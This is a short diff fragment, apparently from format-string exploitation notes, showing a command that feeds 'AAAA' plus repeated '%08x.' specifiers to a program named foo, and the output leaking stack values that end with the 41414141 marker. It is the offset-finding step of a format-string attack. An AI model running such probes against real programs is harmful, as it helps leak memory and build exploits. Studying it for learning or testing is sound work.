@@ -1,0 +1,3 @@
+ &amp;gt;&amp;gt;&amp;gt;  ./foo  $(ruby  -e  'print  "AAAA"  +  "%08x."*9  +  "%x"')
+AAAAffe466f4.00000001.f763b1c9.ffe458df.ffe458de.00000000.ffe459c4.ffe45964.00000000.41414141
+ 
